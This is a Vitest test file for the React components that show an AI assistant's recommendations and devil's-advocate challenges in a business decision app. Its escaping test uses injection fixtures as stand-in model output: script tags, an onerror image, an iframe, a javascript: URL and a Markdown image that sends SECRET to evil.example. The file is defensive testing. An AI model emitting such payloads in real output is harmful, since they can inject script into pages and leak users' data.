import { describe, it, expect } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import type { Decision, DevilsAdvocate, Recommendation } from "@/lib/decisionTypes";
import AnalysisCard from "./AnalysisCard";
import AnalysisControls from "./AnalysisControls";
import { ConfidenceChip, DevilsAdvocateCard, PilotViewCard } from "./AnalysisResults";

// Pilot's view and the Devil's Advocate, drawn to static HTML (no browser needed)
// and read back as a person would read it. The rules on show: Boss decides (the
// buttons close once he has), confidence is a word with reasons and never a
// number, the model's words are only ever drawn as text, and a limit or a refusal
// is explained plainly.

const noop = () => undefined;

// What a person would read: tags gone, entities turned back into characters.
const textOf = (html: string) =>
  html
    .replace(/<[^>]*>/g, " ")
    .replace(/&#x27;/g, "'")
    .replace(/&quot;/g, '"')
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&amp;/g, "&")
    .replace(/\s+/g, " ")
    .trim();

const buttons = (html: string) => [...html.matchAll(/<button([^>]*)>([\s\S]*?)<\/button>/g)].map(m => ({ attrs: m[1] ?? "", label: textOf(m[2] ?? "") }));
const isDisabled = (attrs: string) => /\sdisabled(=|\s|$)/.test(attrs);

const open: Decision = {
  id: "d1",
  question: "Buy another £50k of SUVs?",
  context: "Enquiries are up.",
  options: [
    { key: "a", label: "No change" },
    { key: "b", label: "Add £50k" },
    { key: "c", label: "Add £25k" },
  ],
  createdAt: "2030-01-01T08:00:00.000Z",
  createdByUserId: "u1",
  createdByName: "Olivia Owner",
  updatedAt: "2030-01-01T08:00:00.000Z",
  simulations: [],
  expectations: [],
  events: [{ at: "2030-01-01T08:00:00.000Z", byUserId: "u1", byName: "Olivia Owner", action: "created" }],
};

const recommendation: Recommendation = {
  optionKey: "b",
  reasoning: "Enquiries are up and the stock is turning quickly.",
  confidence: "medium",
  confidenceReasons: ["Eight sales in ninety days.", "Profit is known on six of them."],
  unknowns: ["Whether demand lasts through the winter.", "What the new cars would cost to prepare."],
  askedAt: "2030-01-01T09:00:00.000Z",
};

const challenge: DevilsAdvocate = {
  ranAt: "2030-01-01T10:00:00.000Z",
  caseFor: ["Enquiries are up."],
  caseAgainst: ["Cash is tied up in stock.", "Winter is slower."],
  assumptions: ["Demand holds.", "Prep costs stay the same."],
  unknowns: ["How demand will move."],
  downside: "Fifty thousand pounds is tied up in slow stock.",
  alternative: "Add £25k first and see.",
  pilotView: "Option c looks safer.",
  confidence: "low",
  confidenceReasons: ["Only three sales in ninety days."],
};

const decided: Decision = {
  ...open,
  bossDecision: { optionKey: "a", reasoning: "Stay put.", decidedAt: "2030-01-02T09:00:00.000Z", decidedByUserId: "u1", decidedByName: "Olivia Owner" },
  reviewDueAt: "2999-01-01T00:00:00.000Z",
};

const render = (decision: Decision) => renderToStaticMarkup(<AnalysisCard decision={decision} onChange={noop} />);

describe("the buttons on an open decision", () => {
  const html = render(open);

  it("offers Ask Pilot and Challenge me, both ready to use", () => {
    const found = buttons(html);
    expect(found.map(b => b.label)).toEqual(["Ask Pilot", "Challenge me"]);
    expect(found.some(b => isDisabled(b.attrs))).toBe(false);
  });

  it("says Pilot recommends and Boss decides", () => {
    expect(textOf(html)).toContain("Pilot recommends; Boss decides.");
  });

  it("shows no answer cards before anything has been asked", () => {
    expect(html).not.toContain("<article");
    expect(textOf(html)).not.toContain("Pilot recommends:");
    expect(textOf(html)).not.toContain("Case for");
  });

  it("gives each button a touch-sized target for a phone", () => {
    expect((html.match(/min-height:44px/g) ?? []).length).toBe(2);
  });
});

describe("once Boss has decided, or it has been reviewed, the buttons close with a short reason", () => {
  it("closes both buttons after Boss decides", () => {
    const html = render(decided);
    expect(buttons(html).map(b => isDisabled(b.attrs))).toEqual([true, true]);
    expect(textOf(html)).toContain("Boss has decided, so Pilot's view is closed.");
    expect(textOf(html)).toContain("Pilot recommends; Boss decides.");
  });

  it("closes both when the review is due", () => {
    const html = render({ ...decided, reviewDueAt: "2000-01-01T00:00:00.000Z" });
    expect(buttons(html).map(b => isDisabled(b.attrs))).toEqual([true, true]);
  });

  it("closes both, with its own reason, once it has been reviewed", () => {
    const html = render({
      ...decided,
      outcome: { recordedAt: "2030-06-01T00:00:00.000Z", recordedByUserId: "u1", recordedByName: "O", actuals: [], notes: "", lessons: { pilotRight: "", pilotWrong: "", bossRight: "", unexpected: "", lesson: "" } },
    });
    expect(buttons(html).map(b => isDisabled(b.attrs))).toEqual([true, true]);
    expect(textOf(html)).toContain("This decision has been reviewed, so Pilot's view is closed.");
  });

  it("ties the reason to the buttons for a screen reader", () => {
    const html = render(decided);
    const id = /aria-describedby="([^"]+)"/.exec(html)?.[1];
    expect(id).toBeTruthy();
    expect(html).toContain(`id="${id}"`);
  });

  it("still shows what Pilot said, because it is part of the record", () => {
    const text = textOf(render({ ...decided, pilotRecommendation: recommendation, devilsAdvocate: challenge }));
    expect(text).toContain("Pilot recommends: Add £50k");
    expect(text).toContain("Case against");
  });
});

describe("the controls in each state", () => {
  const controls = (over: Partial<Parameters<typeof AnalysisControls>[0]> = {}) =>
    renderToStaticMarkup(<AnalysisControls busy={null} unavailableReason={null} error={null} remaining={null} onRun={noop} {...over} />);

  it("shows a loading state while Pilot is thinking, and turns both buttons off so it cannot be asked twice", () => {
    for (const [busy, label] of [["recommend", "Asking Pilot…"], ["challenge", "Challenging…"]] as const) {
      const html = controls({ busy });
      expect(textOf(html)).toContain(label);
      expect(textOf(html)).toContain("Pilot is thinking.");
      expect(html).toContain('role="status"');
      expect(buttons(html).map(b => isDisabled(b.attrs))).toEqual([true, true]);
    }
  });

  it("shows an error in words, marked as an alert", () => {
    const html = controls({ error: "You have used all 20 of today's Pilot views and challenges. They start again tomorrow." });
    expect(html).toContain('role="alert"');
    expect(textOf(html)).toContain("You have used all 20 of today's Pilot views and challenges. They start again tomorrow.");
    expect(buttons(html).some(b => isDisabled(b.attrs))).toBe(false); // and it can be tried again
  });

  it("says how many asks are left today, in the singular too, but not while thinking or after an error", () => {
    expect(textOf(controls({ remaining: 19 }))).toContain("19 asks left today.");
    expect(textOf(controls({ remaining: 1 }))).toContain("1 ask left today.");
    expect(textOf(controls({ remaining: 0 }))).toContain("0 asks left today.");
    expect(textOf(controls({ remaining: 5, busy: "recommend" }))).not.toContain("left today");
    expect(textOf(controls({ remaining: 5, error: "x" }))).not.toContain("left today");
  });

  it("shows nothing about a limit before anything has been asked", () => {
    const text = textOf(controls());
    expect(text).not.toContain("left today");
    expect(text).not.toContain("Pilot is thinking");
  });
});

describe("Pilot's view", () => {
  const html = render({ ...open, pilotRecommendation: recommendation });
  const text = textOf(html);

  it("names the recommended option by its label, not just its letter", () => {
    expect(text).toContain("Pilot recommends: Add £50k");
    expect(text).not.toContain("Pilot recommends: b");
  });

  it("gives the reasoning", () => {
    expect(text).toContain("Enquiries are up and the stock is turning quickly.");
  });

  it("shows confidence as a word with the reasons listed under it", () => {
    expect(text).toContain("Medium confidence");
    expect(text).toContain("Eight sales in ninety days.");
    expect(text).toContain("Profit is known on six of them.");
  });

  it("lists what Pilot does not know", () => {
    expect(text).toContain("What Pilot does not know");
    expect(text).toContain("Whether demand lasts through the winter.");
    expect(text).toContain("What the new cars would cost to prepare.");
  });

  it("says so when Pilot listed nothing unknown, without pretending that means nothing is missing", () => {
    const empty = textOf(render({ ...open, pilotRecommendation: { ...recommendation, unknowns: [] } }));
    expect(empty).toContain("Pilot listed nothing it could not tell. Check that against what you know.");
  });

  it("says when it was asked, in UK time", () => {
    expect(text).toMatch(/Asked 1 Jan,? 09:00\./);
    expect(textOf(render({ ...open, pilotRecommendation: { ...recommendation, askedAt: "2030-07-01T09:00:00.000Z" } }))).toMatch(/Asked 1 Jul,? 10:00\./); // BST
  });

  it("does not show a challenge that has not been run", () => {
    expect(text).not.toContain("Case for");
    expect(text).not.toContain("Devil's Advocate");
  });

  it("says plainly when the option it named is no longer on the decision", () => {
    const gone = textOf(render({ ...open, options: open.options.slice(0, 2), pilotRecommendation: { ...recommendation, optionKey: "c" } }));
    expect(gone).toContain("Pilot recommends: an option that is no longer on this decision");
  });
});

describe("the Devil's Advocate", () => {
  const html = render({ ...open, devilsAdvocate: challenge });
  const text = textOf(html);

  it("shows every part, in this order", () => {
    const order = ["Case for", "Case against", "What must be true", "What we do not know", "If we are wrong", "A safer alternative", "Pilot's view"];
    const positions = order.map(heading => text.indexOf(heading));
    positions.forEach((p, i) => expect(p, order[i]).toBeGreaterThan(-1));
    expect([...positions].sort((a, b) => a - b)).toEqual(positions);
  });

  it("shows what is in each part", () => {
    for (const expected of [
      "Enquiries are up.",
      "Cash is tied up in stock.",
      "Winter is slower.",
      "Demand holds.",
      "Prep costs stay the same.",
      "How demand will move.",
      "Fifty thousand pounds is tied up in slow stock.",
      "Add £25k first and see.",
      "Option c looks safer.",
    ]) {
      expect(text).toContain(expected);
    }
  });

  it("shows confidence as a word with its reasons", () => {
    expect(text).toContain("Low confidence");
    expect(text).toContain("Only three sales in ninety days.");
  });

  it("says it is arguing on purpose and is not a prediction", () => {
    expect(text).toContain("Argues against the plan on purpose, to test it. It is not a prediction.");
  });

  it("does not show a recommendation that has not been asked for", () => {
    expect(text).not.toContain("Pilot recommends:");
  });

  it("shows both cards when both have been run", () => {
    const both = textOf(render({ ...open, pilotRecommendation: recommendation, devilsAdvocate: challenge }));
    expect(both).toContain("Pilot recommends: Add £50k");
    expect(both).toContain("Case against");
  });
});

describe("confidence is a word, never a number or a percentage", () => {
  it("shows exactly the three words for the three levels", () => {
    expect(textOf(renderToStaticMarkup(<ConfidenceChip level="low" reasons={[]} />))).toBe("Low confidence");
    expect(textOf(renderToStaticMarkup(<ConfidenceChip level="medium" reasons={[]} />))).toBe("Medium confidence");
    expect(textOf(renderToStaticMarkup(<ConfidenceChip level="high" reasons={[]} />))).toBe("High confidence");
  });

  it("shows no digits or percent sign for a chip and cards that carry no numbers of their own", () => {
    const plain: Decision = {
      ...open,
      pilotRecommendation: { ...recommendation, confidenceReasons: ["Few sales."], unknowns: ["Demand."], reasoning: "Sound plan." },
      devilsAdvocate: { ...challenge, confidenceReasons: ["Few sales."] },
    };
    const text = textOf(render(plain)).replace(/Asked 1 Jan,? 09:00\.|Run 1 Jan,? 10:00\./g, "").replace(/Add £(50|25)k/g, "").replace(/£25k/g, "");
    expect(text).not.toMatch(/%/);
    expect(text).not.toMatch(/\bconfidence\b[^.]*\d/i);
  });

  it("refuses to draw a damaged record's number as confidence, and does not fall over", () => {
    const html = renderToStaticMarkup(<ConfidenceChip level={82 as never} reasons={["reason"]} />);
    expect(textOf(html)).toContain("Confidence not stated");
    expect(textOf(html)).not.toContain("82");
  });
});

describe("what the model wrote is only ever drawn as text", () => {
  const hostile: Decision = {
    ...open,
    pilotRecommendation: {
      ...recommendation,
      reasoning: `<script>alert(1)</script> ![p](https://evil.example/leak?d=SECRET) <img src=x onerror=alert(1)> <a href="https://evil.example">click</a>`,
      confidenceReasons: ["<b>bold</b>"],
      unknowns: ["<iframe src=https://evil.example></iframe>"],
    },
    devilsAdvocate: { ...challenge, caseFor: ["<script>alert(2)</script>"], downside: `"><img src=x>`, pilotView: "javascript:alert(3)" },
  };
  const html = render(hostile);

  it("makes no script, picture, link or frame out of it", () => {
    for (const tag of ["<script", "<img", "<iframe", "<a ", "<b>"]) expect(html, tag).not.toContain(tag);
    expect(html).not.toContain('href="https://evil.example"');
    // the characters are still there, but as inert escaped text, not as a tag
    expect(html).toContain("&lt;img src=x");
    expect(html).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
  });

  it("shows the words themselves, so nothing is hidden from the person reading", () => {
    const text = textOf(html);
    expect(text).toContain("<script>alert(1)</script>");
    expect(text).toContain("javascript:alert(3)");
  });
});

describe("a decision that was edited after Pilot answered", () => {
  const edited: Decision = {
    ...open,
    pilotRecommendation: recommendation,
    devilsAdvocate: challenge,
    events: [
      ...open.events,
      { at: "2030-01-01T09:30:00.000Z", byUserId: "u1", byName: "O", action: "recommendation" },
      { at: "2030-01-01T09:45:00.000Z", byUserId: "u1", byName: "O", action: "edited" },
    ],
  };

  it("warns on the answer that came before the edit, and only that one", () => {
    const text = textOf(render(edited));
    const warnings = text.match(/This decision was edited after this was written/g) ?? [];
    expect(warnings).toHaveLength(1); // Pilot's view (09:00) is older than the edit (09:45); the challenge (10:00) is newer
    expect(text.indexOf("This decision was edited")).toBeLessThan(text.indexOf("The Devil's Advocate"));
  });

  it("does not warn when nothing was edited", () => {
    expect(textOf(render({ ...open, pilotRecommendation: recommendation }))).not.toContain("was edited");
  });
});

describe("a damaged record does not take the screen down", () => {
  it("copes with lists that are missing or not lists", () => {
    const damaged = {
      ...open,
      pilotRecommendation: { ...recommendation, unknowns: undefined, confidenceReasons: "text" },
      devilsAdvocate: { ...challenge, caseFor: undefined, caseAgainst: null, assumptions: 5, unknowns: {} },
    } as unknown as Decision;
    const text = textOf(render(damaged));
    expect(text).toContain("Pilot recommends: Add £50k");
    expect(text).toContain("Case for");
  });

  it("can be drawn on its own, with no page around it and no login provider", () => {
    expect(renderToStaticMarkup(<PilotViewCard decision={open} view={recommendation} />)).toContain("Pilot recommends");
    expect(renderToStaticMarkup(<DevilsAdvocateCard decision={open} view={challenge} />)).toContain("Case for");
  });
});
